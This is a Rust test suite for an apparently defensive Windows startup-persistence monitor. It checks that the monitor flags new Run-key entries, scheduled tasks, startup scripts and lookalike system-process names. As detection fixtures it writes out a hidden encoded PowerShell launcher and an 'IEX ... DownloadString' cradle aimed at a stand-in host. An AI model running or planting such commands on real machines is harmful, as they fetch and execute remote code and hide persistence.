mod common;
use common::*;

#[test]
fn a_new_run_key_entry_is_flagged_after_the_baseline() {
    let env = WindowsEnv::new();
    env.registry(RUN_HKCU, &[("OneDrive", r#""C:\Program Files\OneDrive.exe" /background"#)]);
    env.engine.baseline();
    env.registry(RUN_HKCU, &[("OneDrive", r#""C:\Program Files\OneDrive.exe" /background"#), ("Updater", r"C:\Users\me\app.exe")]);
    let f = env.findings();
    assert_eq!(f.len(), 1, "{f:?}");
    assert!(f[0].contains("startup entry NEW"));
    assert!(f[0].contains("Updater"));
}

#[test]
fn nothing_is_flagged_when_the_run_keys_are_unchanged() {
    let env = WindowsEnv::new();
    env.registry(RUN_HKCU, &[("OneDrive", r"C:\od.exe")]);
    env.engine.baseline();
    assert_eq!(env.engine.dekho(false).code, 0);
}

#[test]
fn encoded_powershell_is_flagged_as_a_hidden_command() {
    let env = WindowsEnv::new();
    env.engine.baseline();
    env.registry(RUN_HKCU, &[("Tool", "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA")]);
    assert!(env.findings().iter().any(|f| f.contains("runs hidden commands")));
}

#[test]
fn a_download_cradle_is_flagged_case_insensitively() {
    let env = WindowsEnv::new();
    env.engine.baseline();
    env.registry(RUN_HKCU, &[("Tool", "cmd /c powershell IEX (New-Object Net.WebClient).DownloadString('http://x.invalid')")]);
    assert!(env.findings().iter().any(|f| f.contains("runs hidden commands")));
}

#[test]
fn a_system_process_name_outside_the_windows_folder_is_flagged() {
    let env = WindowsEnv::new();
    env.engine.baseline();
    env.registry(RUN_HKCU, &[("svc", r"C:\Users\me\AppData\Roaming\svchost.exe")]);
    assert!(env.findings().iter().any(|f| f.contains("System-process name")));
}

#[test]
fn a_changed_value_is_flagged_as_changed() {
    let env = WindowsEnv::new();
    env.registry(RUN_HKCU, &[("App", r"C:\a.exe")]);
    env.engine.baseline();
    env.registry(RUN_HKCU, &[("App", r"C:\b.exe")]);
    assert!(env.findings().iter().any(|f| f.contains("startup entry CHANGED")));
}

#[test]
fn a_new_startup_folder_script_is_flagged_with_its_contents_inspected() {
    let env = WindowsEnv::new();
    env.engine.baseline();
    write(
        &env.tmp.path().join("appdata/Microsoft/Windows/Start Menu/Programs/Startup/run.bat"),
        "@echo off\r\npowershell -nop -w hidden -enc AAAA\r\n",
    );
    let f = env.findings();
    assert!(f.iter().any(|x| x.contains("startup entry NEW")));
    assert!(f.iter().any(|x| x.contains("runs hidden commands")));
}

#[test]
fn scheduled_task_changes_are_reported() {
    let env = WindowsEnv::new();
    env.fake.set("powershell -NoProfile -NonInteractive -Command $ErrorActionPreference='SilentlyContinue'; Get-ScheduledTask", 0, "\\Backup -> C:\\b.exe \r\n");
    env.engine.baseline();
    env.fake.set(
        "powershell -NoProfile -NonInteractive -Command $ErrorActionPreference='SilentlyContinue'; Get-ScheduledTask",
        0,
        "\\Backup -> C:\\b.exe \r\n\\Evil -> C:\\Users\\me\\e.exe \r\n",
    );
    assert!(env.findings().iter().any(|f| f.contains("scheduled tasks changed")));
}

#[test]
fn install_creates_a_ten_minute_scheduled_task() {
    let env = WindowsEnv::new();
    let out = env.engine.install(std::path::Path::new(r"C:\Program Files\Sheshnag\sheshnag.exe"));
    assert_eq!(out.code, 0, "{}", out.output);
    assert!(env.fake.called("schtasks /Create /TN Sheshnag"));
    assert!(env.fake.called("/MO 10"));
    assert!(env.fake.called("dekho quiet"));
}

#[test]
fn quarantine_exports_then_deletes_the_registry_value() {
    let env = WindowsEnv::new();
    env.registry(RUN_HKCU, &[("Bad", r"C:\bad.exe")]);
    env.fake.set(&format!("reg query {RUN_HKCU} /v Bad"), 0, &format!("\r\nHKEY_{RUN_HKCU}\r\n    Bad    REG_SZ    C:\\bad.exe\r\n"));
    let out = env.engine.jaago("Bad");
    assert!(out.output.contains("quarantined"), "{}", out.output);
    assert!(env.fake.called(&format!("reg delete {RUN_HKCU} /v Bad /f")));
    assert!(env.engine.state_dir().join("quarantine/Bad.entry.txt").exists());
}
